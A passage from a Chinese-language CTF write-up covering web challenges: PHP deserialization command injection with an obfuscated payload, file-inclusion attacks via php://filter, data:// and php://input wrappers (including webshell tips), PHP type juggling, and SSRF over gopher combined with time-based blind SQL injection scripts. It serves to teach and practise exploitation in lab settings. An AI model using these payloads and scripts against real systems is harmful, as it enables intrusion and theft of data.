<p>payload为：</p>
<p>$a &#x3D; new ease(“ping”,array(‘$(printf${IFS}”\143\141\164\40\146\154\141\147\137\61\163\137\150\145\162\145\57\146\154\141\147\137\70\63\61\142\66\71\60\61\62\143\66\67\142\63\65\146\56\160\150\160”)’));</p>
<p>输出Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319</p>
<p>得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115195526905.png" alt="image-20221115195526905"></p>
<h2 id="2-file-include"><a href="#2-file-include" class="headerlink" title="2.file_include"></a>2.file_include</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115213223052.png" alt="image-20221115213223052"></p>
<p>传参?filename&#x3D;&#x2F;etc&#x2F;passwd</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115213618254.png" alt="image-20221115213618254"></p>
<p>有用</p>
<p>看看能不能利用远程文件包含</p>
<p>?filename&#x3D;<a target="_blank" rel="noopener" href="http://baidu.com/">http://baidu.com/</a></p>
<p>没有反应，看来不能</p>
<p>include包含一个php文件 返回的是执行之后的 源码是看不到的，可以下载文件看源码</p>
<p>php的封装可以让任意文件包含漏洞变成任意文件下载漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=check.php</span><br><span class="line"></span><br><span class="line">data流执行系统命令id （allow_url_indlude on）</span><br><span class="line">data://text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTs/Pg==</span><br><span class="line"></span><br><span class="line">封装器文件写入phpinfo()</span><br><span class="line">php://filter/write=convert.base64-decode/resource=test.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pgo=</span><br><span class="line"></span><br><span class="line">POST方法 （allow_url_fopen on allow_url_include on）</span><br><span class="line">?page=php://input &lt;? system(&#x27;id&#x27;);?&gt;</span><br><span class="line"></span><br><span class="line">用环境变量</span><br><span class="line">file:///proc/self/environ</span><br><span class="line"></span><br><span class="line">利用日志文件</span><br><span class="line">file:///var/log/apache2/access.log </span><br><span class="line">file:///var/log/apache2/error.log</span><br></pre></td></tr></table></figure>

<p>都不行</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115214824091.png" alt="image-20221115214824091"></p>
<p>尝试扫描目录，仍然不行</p>
<p>把注意力集中在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=check.php</span><br></pre></td></tr></table></figure>

<p>利用的过程中我发现即使包含一个没有的文件，格式写错 还会报 do not hack</p>
<p>怀疑check.php里也接受一个名为filename的参数 而且对参数进行了过滤</p>
<p>在php封装器 单词与单词 敲打0</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/re0ad=con0vert.ba0se64-enc0ode/resource=check.php</span><br></pre></td></tr></table></figure>

<p>传参后，不在报错</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115214924349.png" alt="image-20221115214924349"></p>
<p>说明check.php将一些关键词过滤了</p>
<p>如何绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">了解PHP封装器：</span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=check.php</span><br><span class="line"></span><br><span class="line">php://filter/read </span><br><span class="line">php://filter/write</span><br><span class="line"></span><br><span class="line">read和write是可选性 一个为读 一个为写</span><br><span class="line"></span><br><span class="line">resource= 指定过滤的数据流</span><br><span class="line"></span><br><span class="line">php://filter/read=“这段的位置为过滤器”/resource=check.php</span><br><span class="line"></span><br><span class="line">共有字符串过滤器 转换过滤器 压缩过滤器 加密过滤器</span><br></pre></td></tr></table></figure>

<p>因为我们是要读取文件源码 需要用到转换过滤器<strong>（</strong>共三种）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert.base64-encode &amp; convert.base64-decode</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert.quoted-printable-encode &amp; convert.quoted-printable-decode</span><br></pre></td></tr></table></figure>

<p>这两种都过滤了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.* //格式如下</span><br><span class="line"></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;</span><br><span class="line"></span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure>

<p>尝试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=check.php</span><br><span class="line">其中UCS-2LE，UCS-2BE为编码格式</span><br></pre></td></tr></table></figure>

<p>又不行</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115220107471.png" alt="image-20221115220107471"></p>
<p>这个过滤器有支持很多编码，试试别的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF-7.UCS-2/resource=check.php</span><br></pre></td></tr></table></figure>

<p>成功</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115220217159.png" alt="image-20221115220217159"></p>
<p>然后寻找字典，可以爆破，找到地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF-7.UCS-2/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221115220354301.png" alt="image-20221115220354301"></p>
<h2 id="3-easyphp"><a href="#3-easyphp" class="headerlink" title="3.easyphp"></a>3.easyphp</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116184741060.png" alt="image-20221116184741060"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="comment">//这里对提交的a需要满足a非空,且a的数值大于6000000 且 a的长度不超过3</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//intval函数就是将我们输入的字符串类型转化成整数，例如intval(‘1e5’)就是10000。因此，科学计数法表示的1e7/8/9可以满足上述三个条件。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="comment">//这里对提交的b需要满足b非空，并且b的md5值的倒数6位为8b184b</span></span><br><span class="line">        <span class="comment">//写个脚本进行爆破，得到(53724)</span></span><br><span class="line">       </span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="comment">//将c用json格式编码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="comment">//如果c是数组，并且c的m键值不是数值类型，并且c的m键值大于2022</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//is_numeric函数的用法，is_numeric在php中判断参数是否是数值类型是否是数字或数字字符串。</span></span><br><span class="line">    <span class="comment">//is_numeric(&quot;a123&quot;)返回false，is_numeric(&quot;123a&quot;)也返回false</span></span><br><span class="line">    <span class="comment">//&#x27;123a&#x27;和一个整数作比较时，它会转换成123；&#x27;a123&#x27;和整数作比较时，由于第一个位置是a，非整数，php则规定其值为0，即变成了0和123比较,可以构造出一个c:&#123;&quot;m&quot;:&quot;12345a&quot;&#125;等等</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="comment">//n值是一个array类型，大小为2，并且第一个元素是一个数组类型。即类似于：[[*,*],*]。</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="comment">//寻找n值中的DGGJ</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    	<span class="comment">//如果找不到，则直接退出</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//foreach遍历，如果n中含有DGGJ，则退出</span></span><br><span class="line">        <span class="comment">//array_search这个函数的作用是在数组中查找元素，并返回其下标。</span></span><br><span class="line">		<span class="comment">//而这个函数在进行元素查找的过程中进行的比较是==而非===，因此同样是采取弱类型比较</span></span><br><span class="line">		<span class="comment">//&#x27;DGGJ&#x27;没有数字字符串,在php中&quot;字符串&quot;==0,所以将array[n]第二个值设为0</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> Emmm...</span><br></pre></td></tr></table></figure>

<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=1e7&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;12345a&quot;,&quot;n&quot;:[[1,2],0]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116205921664.png" alt="image-20221116205921664"></p>
<h2 id="4-fileinclude"><a href="#4-fileinclude" class="headerlink" title="4.fileinclude"></a>4.fileinclude</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116210636534.png" alt="image-20221116210636534"></p>
<p>代码很简单</p>
<p>想到PHP伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">常用的伪协议如下：</span><br><span class="line"></span><br><span class="line">php://filter 读取文件源码</span><br><span class="line">注意：使用文件包含函数包含文件时,文件中的代码会被执行,如果想要读取文件源码,可以使用base64对文件内容进行编码,编码后的文 件内容不会被执行,而是展示在页面中,我们将页面中的内容使用base64解码,就可以获取文件的源码了</span><br><span class="line"></span><br><span class="line">php://input 任意代码执行</span><br><span class="line">利用php中流的概念，将原本的include的文件流重定向到了用户可控制的输入流中命令执行</span><br><span class="line">用post请求输入想要执行的代码</span><br><span class="line"></span><br><span class="line">data://text/plain 任意代码执行</span><br><span class="line">data://协议通过执行资源类型,使后面的内容当做文件内容来执行,从而造成任意代码执行</span><br><span class="line">?url=data://text/plain,&lt;?php system(&#x27;id&#x27;) ?&gt;</span><br><span class="line"></span><br><span class="line">zip:// 配合文件上传开启后门</span><br><span class="line">zip://协议用来读取压缩包中的文件,可以配合文件上传开启后门,获取webshell</span><br><span class="line">将shell.txt压缩成zip,再将后缀名改为jpg上传至服务器,再通过zip伪协议访问压缩包里的文件,从而链接木马</span><br><span class="line">用法：?url=zip://shell.jpg</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=php://input</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116213314692.png" alt="image-20221116213314692"></p>
<p>将得到的值base64解密</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116213434223.png" alt="image-20221116213434223"></p>
<h2 id="5-very-easy-sql"><a href="#5-very-easy-sql" class="headerlink" title="5.very_easy_sql"></a>5.very_easy_sql</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116213753176.png" alt="image-20221116213753176"></p>
<p>源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116213805696.png" alt="image-20221116213805696"></p>
<p>访问试试</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116213858326.png" alt="image-20221116213858326"></p>
<p>在use.php文件中，发现存在一个远程请求的功能，怀疑此处是ssrf漏洞</p>
<p> 写python脚本，使用了sleep时间盲注</p>
<p><strong>官方脚本，直接获取flag</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://61.147.171.105:65547/use.php?url=&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">        <span class="comment"># poc=&quot;&#x27;) union select 1,2,if(1=1,sleep(5),1) # &quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># security</span></span><br><span class="line">        <span class="comment"># poc=&quot;&#x27;) union select 1,2,if(ascii( substr((database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># flag</span></span><br><span class="line">        <span class="comment"># poc=&quot;&#x27;) union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot;</span></span><br><span class="line"></span><br><span class="line">        poc = <span class="string">&quot;&#x27;) union select 1,2,if(ascii( substr((select * from flag),&quot;</span> + <span class="built_in">str</span>(pos) + <span class="string">&quot;,1) )=&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i) + <span class="string">&quot;,sleep(2),1) # &quot;</span></span><br><span class="line"></span><br><span class="line">        bs = <span class="built_in">str</span>(base64.b64encode(poc.encode(<span class="string">&quot;utf-8&quot;</span>)), <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        final_poc = <span class="string">&quot;gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot;</span> + bs + <span class="string">&quot;%3B%250d%250a&quot;</span></span><br><span class="line">        t1 = time.time()</span><br><span class="line">        res = requests.get(url + final_poc)</span><br><span class="line">        t2 = time.time()</span><br><span class="line">        <span class="keyword">if</span> (t2 - t1 &gt; <span class="number">2</span>):</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>个人脚本</strong></p>
<p>先在本地测试</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1:80&quot;</span></span><br><span class="line">content = <span class="string">&quot;uname=admin&amp;passwd=admin&quot;</span></span><br><span class="line">content_length = <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: &#123;&#125;</span></span><br><span class="line"><span class="string">User-Agent: curl/7.43.0</span></span><br><span class="line"><span class="string">Accept: */*</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(host,content_length,content)</span><br><span class="line"></span><br><span class="line">tmp = urllib.parse.quote(test) </span><br><span class="line">new = tmp.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">result = urllib.parse.quote(new) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gopher://&quot;</span>+host+<span class="string">&quot;/_&quot;</span>+result)</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221116221138758.png" alt="image-20221116221138758"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输出结果：</span><br><span class="line">gopher://127.0.0.1:80/_POST%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AUser-Agent%253A%2520curl/7.43.0%250D%250AAccept%253A%2520%252A/%252A%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252024%250D%250A%250D%250Auname%253Dadmin%2526passwd%253Dadmin%250D%250A</span><br></pre></td></tr></table></figure>

<p>然后用BP抓包</p>
<p><img src="https://img-blog.csdnimg.cn/6f6c6c21e43d49fcbb6189cde3eeaebe.png" alt="img"></p>
<p> 返回值里有一个Set-Cookie 解码看看</p>
<p><img src="https://img-blog.csdnimg.cn/174d38689c7c4bb799731bec9f200bf1.png" alt="img"></p>
<p>解码结果就是admin  这个cookie 就是注入点 重新写一个payload 由于无回显 现在用sleep盲注 构造语句  admin’) and if(1,sleep(10),1)# </p>
<p>进行编码  </p>
<p><img src="https://img-blog.csdnimg.cn/7e2b71f03cee4319ac93e011e3839754.png" alt="img"></p>
<p>继续写脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1:80&quot;</span></span><br><span class="line">cookie=<span class="string">&quot;this_is_your_cookie=YWRtaW4nKSBhbmQgaWYoMSxzbGVlcCgxMCksMSkj&quot;</span></span><br><span class="line"></span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: &#123;&#125;</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Cookie:&#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(host,cookie)</span><br><span class="line"></span><br><span class="line">tmp = urllib.parse.quote(test) </span><br><span class="line">new = tmp.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">result = urllib.parse.quote(new) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gopher://&quot;</span>+host+<span class="string">&quot;/_&quot;</span>+result)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/9dd9f19362b34d589fbb2c44b4204d3d.png" alt="img"></p>
<p> 然后继续用BP抓包看看</p>
<p><img src="https://img-blog.csdnimg.cn/e1a68731f6ab4a91bdf4999bfe2855e0.png" alt="img"></p>
<p>构造payload脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://61.147.171.105:65547//use.php?url=&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="comment">#poc=&quot;&#x27;) union select 1,2,if(1=1,sleep(5),1) # &quot;</span></span><br><span class="line"> </span><br><span class="line">        <span 